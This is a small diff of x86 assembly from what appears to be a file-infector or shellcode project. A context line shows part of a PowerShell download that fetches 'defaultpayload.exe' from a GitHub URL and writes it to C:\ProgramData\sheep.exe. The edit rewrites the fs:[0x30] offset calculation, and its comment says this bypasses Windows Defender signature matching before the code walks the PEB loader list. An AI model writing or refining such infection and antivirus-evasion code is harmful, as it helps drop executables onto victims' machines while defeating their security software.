@@ -32,8 +32,8 @@ infection__data__powershell:
    db "'https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe', 'C:\\ProgramData\\sheep.exe')", 34, 0
 infection__data:
    pop ebx                      ; get the pointer to the start of the data
-   mov eax, 0xCF                ; bypass Windows Defender matching on fs:[0x30]
-   xor al, 0xFF
+   mov eax, 0xFFFFFFCF          ; bypass Windows Defender matching on fs:[0x30]
+   neg eax
    mov eax, [fs:eax]            ; get current PEB
    mov ecx, [eax+0xC]           ; peb->Ldr
    mov eax, [ecx+0xC]           ; ldr->InLoadOrderModuleList.Flink (the current module)
